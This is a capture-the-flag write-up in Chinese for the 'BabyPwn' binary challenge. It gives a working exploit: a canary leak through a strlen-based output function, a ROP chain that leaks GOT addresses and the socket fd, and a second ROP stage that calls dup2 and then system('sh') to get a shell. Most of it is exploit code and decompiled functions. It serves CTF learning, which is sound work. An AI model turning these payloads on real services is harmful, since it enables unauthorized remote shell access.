# BabyPwn

	RELRO:    Partial RELRO
	Stack:    Canary found
	NX:       NX enabled
	PIE:      No PIE
	
這題和 [tutorial](https://github.com/briansp8210/CTF_writeup/tree/master/CSAW_2016/tutorial) 蠻像的，要先 leak 出 canary 以及 libc address，並在開 shell 之前先利用 `dup2` 將 file descripter 設好。

## exploit

題目使用的 input function 會固定接收 100bytes 的輸入，但 output function 則會用 `strlen(buf)` 來決定輸出長度。所以算好 offset，把 canary 的 null byte 蓋掉，就可以 leak  出他的值。

```c
ssize_t input_func(void *buf, size_t len)
{
  int v2;
  ssize_t result;
  int v4;

  v2 = *MK_FP(__GS__, 20);
  result = recv(fd, buf, len, 0);
  v4 = *MK_FP(__GS__, 20) ^ v2;
  return result;
}
```

```c
ssize_t output_func(const char *buf)
{
  int v1;
  size_t len;
  ssize_t result;
  int v4;
  
  v1 = *MK_FP(__GS__, 20);
  len = strlen(buf);
  result = send(fd, buf, len, 0);
  v4 = *MK_FP(__GS__, 20) ^ v1;
  return result;
}
```
  
接著就利用 stack overflow 來做 ROP，首先用 `output_func` 多 leak 出幾個 GOT 上的位址，在 [libcdb.com](http://libcdb.com/libc/92) 比較找到對應的 libc。  
再來也把存在 `.bss` 上的 `fd` 給讀出來，準備給 `dup2` 用。

```python
# 因為已經確定 libc 版本了，這裡就只有讀出一個來用
r.sendafter('Input Your Message : ',
            'A'*40 + p32(canary) + 'B'*12 +
            p32(write_output) + p32(pop_ebx_ret) + p32(send_got) +
            p32(write_output) + p32(menu) + p32(fd_addr)
           )
```

return 回選單 function 後，就可以做第二次 ROP，先用 `dup2` 把 `stdin` 和 `stdout` 設好，再 `system("sh")` 就可以順利拿 shell 了。

```python
r.sendafter('Input Your Message : ',
            'A'*40 + p32(canary) + 'B'*12 +
            p32(dup2) + p32(pop_edi_ebp_ret) + p32(fd) + p32(0) +
            p32(dup2) + p32(pop_edi_ebp_ret) + p32(fd) + p32(1) +
            p32(system_plt) + p32(0xdeadbeef) + p32(sh)
           )
```

`FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}`
